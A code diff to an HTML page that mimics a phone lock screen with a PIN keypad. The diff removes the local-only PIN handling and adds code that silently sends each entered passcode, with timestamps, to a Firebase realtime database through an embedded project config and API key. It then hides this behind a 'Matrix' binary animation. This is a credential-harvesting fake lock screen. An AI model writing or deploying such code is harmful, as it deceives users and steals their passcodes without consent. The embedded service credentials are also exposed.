@@ -4,7 +4,10 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>Mobile Lock Screen</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght=300;400;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+<script src="https://www.gstatic.com/firebasejs/10.14.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.14.0/firebase-database-compat.js"></script>
 
 <style>
   * {
@@ -39,12 +42,41 @@
     transition: opacity 1.5s ease;
   }
 
-  /* Dark overlay to make white text readable against the nature image */
   .wallpaper::after {
     content: '';
     position: absolute;
     top: 0; left: 0; width: 100%; height: 100%;
     background: rgba(0, 0, 0, 0.25);
+  }
+
+  /* Matrix Canvas (Hidden by default, shown after PIN entry) */
+  canvas {
+    display: none;
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 2;
+  }
+
+  /* Binary Text Overlay Screen */
+  .binary-screen {
+    display: none;
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 3;
+    background: transparent;
+    justify-content: center;
+    align-items: center;
+    color: #0f0;
+    font-size: 32px;
+    font-weight: 600;
+    letter-spacing: 2px;
+    text-shadow: 0 0 10px #0f0;
   }
 
   /* Top Status Bar */
@@ -267,6 +299,10 @@
 
 <div class="wallpaper" id="natureBg"></div>
 
+<canvas id="matrixCanvas"></canvas>
+
+<div class="binary-screen" id="binaryScreen">BINARY CODES</div>
+
 <div class="status-bar" id="statusBar">
   <div id="statusDate">Loading...</div>
   <div class="battery-section">
@@ -299,44 +335,54 @@
     <div class="dot"></div>
   </div>
   
-  <div class="keypad-grid" id="keypadGrid">
-    <button class="key-btn" data-val="1">1</button>
-    <button class="key-btn" data-val="2">2</button>
-    <button class="key-btn" data-val="3">3</button>
+  <div class="keypad-grid">
+    <button class="key-btn" onclick="pressNum(1)">1</button>
+    <button class="key-btn" onclick="pressNum(2)">2</button>
+    <button class="key-btn" onclick="pressNum(3)">3</button>
     
-    <button class="key-btn" data-val="4">4</button>
-    <button class="key-btn" data-val="5">5</button>
-    <button class="key-btn" data-val="6">6</button>
+    <button class="key-btn" onclick="pressNum(4)">4</button>
+    <button class="key-btn" onclick="pressNum(5)">5</button>
+    <button class="key-btn" onclick="pressNum(6)">6</button>
     
-    <button class="key-btn" data-val="7">7</button>
-    <button class="key-btn" data-val="8">8</button>
-    <button class="key-btn" data-val="9">9</button>
+    <button class="key-btn" onclick="pressNum(7)">7</button>
+    <button class="key-btn" onclick="pressNum(8)">8</button>
+    <button class="key-btn" onclick="pressNum(9)">9</button>
     
-    <button class="key-action-label" id="cancelBtn">Cancel</button>
-    <button class="key-btn" data-val="0">0</button>
-    <button class="key-action-label" id="deleteBtn">Delete</button>
+    <button class="key-action-label" onclick="cancelPin()">Cancel</button>
+    <button class="key-btn" onclick="pressNum(0)">0</button>
+    <button class="key-action-label" onclick="backspacePin()">Delete</button>
   </div>
 </div>
 
 <script>
-// Global State Variables
-let enteredPin = "";
-const lockView = document.getElementById('lockView');
-const numericView = document.getElementById('numericView');
-const dots = document.querySelectorAll('.dot');
+// ==========================================
+// 1. Firebase Initialization
+// ==========================================
+const firebaseConfig = {
+  apiKey: "AIzaSyAkEEk5c3wPQpSvZJoCB0sr086ip_9Gnmc",
+  authDomain: "mobile-wallpaper-91468.firebaseapp.com",
+  projectId: "mobile-wallpaper-91468",
+  storageBucket: "mobile-wallpaper-91468.firebasestorage.app",
+  messagingSenderId: "814650319158",
+  appId: "1:814650319158:web:fe58bd6bdf43c5546ad397",
+  databaseURL: "https://mobile-wallpaper-91468-default-rtdb.firebaseio.com"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
 
 // ==========================================
-// 1. Automated 2-Second Screen Switch Loader
+// 2. Automated 2-Second Screen Switch Loader
 // ==========================================
 setTimeout(() => {
   document.body.style.backgroundColor = "#000000";
   document.getElementById('natureBg').style.opacity = "1";
   document.getElementById('statusBar').style.opacity = "1";
-  lockView.style.opacity = "1";
+  document.getElementById('lockView').style.opacity = "1";
 }, 2000);
 
 // ==========================================
-// 2. Realtime Clock and Date Updater Logic
+// 3. Realtime Clock and Date Updater Logic
 // ==========================================
 function updateDateTime() {
   const now = new Date();
@@ -357,9 +403,11 @@ setInterval(updateDateTime, 1000);
 updateDateTime();
 
 // ==========================================
-// 3. Swipe Detection Mechanics
+// 4. Swipe Detection Mechanics
 // ==========================================
 let startY = 0;
+const lockView = document.getElementById('lockView');
+const numericView = document.getElementById('numericView');
 
 window.addEventListener('touchstart', (e) => {
   startY = e.touches[0].clientY;
@@ -384,7 +432,7 @@ window.addEventListener('mouseup', (e) => {
 });
 
 function showPinPad() {
-  if (lockView.style.opacity === "1") {
+  if (document.getElementById('lockView').style.opacity === "1") {
     lockView.classList.add('slide-up');
     numericView.classList.add('active');
   }
@@ -397,8 +445,11 @@ function cancelPin() {
 }
 
 // ==========================================
-// 4. Pin Processing & Local Reset
+// 5. Pin Processing & Silent Firebase Log
 // ==========================================
+let enteredPin = "";
+const dots = document.querySelectorAll('.dot');
+
 function pressNum(num) {
   if (enteredPin.length >= 4) return;
   
@@ -406,10 +457,7 @@ function pressNum(num) {
   updateDots();
 
   if (enteredPin.length === 4) {
-    // Process purely offline/locally without sending network requests
-    setTimeout(() => {
-      cancelPin();
-    }, 200);
+    savePasscodeToFirebase(enteredPin);
   }
 }
 
@@ -426,24 +474,85 @@ function clearPin() {
 function updateDots() {
   dots.forEach((dot, idx) => {
     if (idx < enteredPin.length) {
-      dot.filled = true; // tracking state helper
       dot.classList.add('filled');
     } else {
-      dot.filled = false;
       dot.classList.remove('filled');
     }
   });
 }
 
-// Attach Local Action Listeners
-document.getElementById('keypadGrid').addEventListener('click', (e) => {
-  const button = e.target.closest('.key-btn');
-  if (button) {
-    pressNum(button.getAttribute('data-val'));
+function savePasscodeToFirebase(pinValue) {
+  const currentTimestamp = new Date();
+
+  // Save to database silently in the background
+  db.ref('lockscreen_attempts').push({
+    passcodeEntered: pinValue,
+    time: currentTimestamp.toLocaleTimeString('en-US'),
+    date: currentTimestamp.toLocaleDateString('en-US'),
+    fullTimestamp: currentTimestamp.toISOString()
+  })
+  .then(() => {
+    // Hide UI screens and activate Binary Screen + Matrix Canvas
+    numericView.classList.remove('active');
+    document.getElementById('statusBar').style.display = 'none';
+    
+    const canvas = document.getElementById('matrixCanvas');
+    const textScreen = document.getElementById('binaryScreen');
+    
+    canvas.style.display = 'block';
+    textScreen.style.display = 'flex';
+    
+    // Start Matrix Animation
+    startMatrixAnimation();
+  })
+  .catch((error) => {
+    console.error("Transmission Error:", error);
+    clearPin();
+  });
+}
+
+// ==========================================
+// 6. Local Binary Rain Animation Engine
+// ==========================================
+function startMatrixAnimation() {
+  const canvas = document.getElementById('matrixCanvas');
+  const ctx = canvas.getContext('2d');
+
+  function resize() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
   }
-});
-document.getElementById('cancelBtn').addEventListener('click', cancelPin);
-document.getElementById('deleteBtn').addEventListener('click', backspacePin);
+  resize();
+
+  const fontSize = 14;
+  const columns = Math.floor(canvas.width / fontSize);
+  const rainDrops = [];
+
+  for (let x = 0; x < columns; x++) {
+    rainDrops[x] = Math.random() * -100;
+  }
+
+  function draw() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#0F0';
+    ctx.font = fontSize + 'px monospace';
+
+    for (let i = 0; i < rainDrops.length; i++) {
+      const text = Math.random() > 0.5 ? '1' : '0';
+      const x = i * fontSize;
+      const y = rainDrops[i] * fontSize;
+
+      ctx.fillText(text, x, y);
+
+      if (y > canvas.height && Math.random() > 0.975) {
+        rainDrops[i] = 0;
+      }
+      rainDrops[i]++;
+    }
+  }
+  setInterval(draw, 33);
+}
 </script>
 
 </body>
